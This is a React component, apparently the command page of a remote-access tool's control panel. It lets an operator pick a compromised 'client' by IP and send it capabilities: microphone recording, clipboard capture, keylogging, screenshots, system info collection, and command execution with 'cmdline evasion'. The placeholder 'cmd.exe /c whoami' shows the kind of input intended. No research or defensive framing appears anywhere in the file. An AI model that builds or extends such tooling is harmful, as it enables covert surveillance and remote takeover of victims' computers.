import React, { useState, useEffect } from 'react';
import { api, CAPABILITIES } from '../api';

function Commands() {
  const [clients, setClients] = useState({});
  const [selectedClient, setSelectedClient] = useState('');
  const [selectedCapability, setSelectedCapability] = useState('1');
  const [commandArgs, setCommandArgs] = useState('');
  const [message, setMessage] = useState(null);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    fetchClients();
  }, []);

  const fetchClients = async () => {
    try {
      const data = await api.getClients();
      setClients(data.clients || {});
    } catch (error) {
      console.error('Error fetching clients:', error);
    }
  };

  const handleSendCommand = async (e) => {
    e.preventDefault();
    
    if (!selectedClient) {
      setMessage({ type: 'error', text: 'Please select a client' });
      return;
    }

    setLoading(true);
    setMessage(null);

    try {
      const result = await api.sendCommand(selectedClient, parseInt(selectedCapability), commandArgs);
      setMessage({ 
        type: 'success', 
        text: `Command sent successfully: ${result.capability_name}${commandArgs ? ' with args: ' + commandArgs : ''}` 
      });
      setTimeout(() => setMessage(null), 5000);
      setCommandArgs(''); // Clear args after sending
    } catch (error) {
      setMessage({ 
        type: 'error', 
        text: `Failed to send command: ${error.response?.data?.message || error.message}` 
      });
    } finally {
      setLoading(false);
    }
  };

  const clientArray = Object.values(clients);

  return (
    <div>
      <div className="card">
        <h2>Send Command to Client</h2>
        
        {message && (
          <div className={message.type === 'error' ? 'error' : 'success'}>
            {message.text}
          </div>
        )}

        <form onSubmit={handleSendCommand}>
          <div className="form-group">
            <label htmlFor="client">Select Client</label>
            <select
              id="client"
              value={selectedClient}
              onChange={(e) => setSelectedClient(e.target.value)}
              required
            >
              <option value="">-- Select a client --</option>
              {clientArray.map((client) => (
                <option key={client.id} value={client.id}>
                  {client.id} ({client.ip})
                </option>
              ))}
            </select>
          </div>

          <div className="form-group">
            <label htmlFor="capability">Select Capability</label>
            <select
              id="capability"
              value={selectedCapability}
              onChange={(e) => setSelectedCapability(e.target.value)}
              required
            >
              {Object.entries(CAPABILITIES)
                .filter(([id]) => id !== '0') // Exclude "No Command"
                .map(([id, name]) => (
                  <option key={id} value={id}>
                    {id} - {name}
                  </option>
                ))}
            </select>
          </div>

          <div className="form-group">
            <label htmlFor="args">Command Arguments (optional)</label>
            <input
              type="text"
              id="args"
              value={commandArgs}
              onChange={(e) => setCommandArgs(e.target.value)}
              placeholder={
                selectedCapability === '6' 
                  ? 'e.g., cmd.exe /c whoami' 
                  : 'Additional parameters for the capability'
              }
            />
            <small style={{ color: '#888', fontSize: '0.85em', marginTop: '5px', display: 'block' }}>
              {selectedCapability === '6' && 'For Command Executor: Enter the full command to execute'}
              {selectedCapability === '1' && 'For Audio Recorder: Optional duration or quality parameters'}
              {!['1', '6'].includes(selectedCapability) && 'Most capabilities don\'t require arguments'}
            </small>
          </div>

          <button type="submit" className="btn" disabled={loading}>
            {loading ? 'Sending...' : 'Send Command'}
          </button>
        </form>
      </div>

      <div className="card">
        <h2>Capability Reference</h2>
        <table className="table">
          <thead>
            <tr>
              <th>ID</th>
              <th>Capability</th>
              <th>Description</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>1</td>
              <td>Audio Recorder</td>
              <td>Records audio from the target's microphone</td>
            </tr>
            <tr>
              <td>2</td>
              <td>Clipboard Monitor</td>
              <td>Monitors and captures clipboard content</td>
            </tr>
            <tr>
              <td>3</td>
              <td>Keylogger</td>
              <td>Captures keyboard input and key presses</td>
            </tr>
            <tr>
              <td>4</td>
              <td>Screenshot</td>
              <td>Takes a screenshot of the target's screen</td>
            </tr>
            <tr>
              <td>5</td>
              <td>Info Collector</td>
              <td>Collects system information and metadata</td>
            </tr>
            <tr>
              <td>6</td>
              <td>Command Executor</td>
              <td>Executes system commands with cmdline evasion</td>
            </tr>
          </tbody>
        </table>
      </div>
    </div>
  );
}

export default Commands;
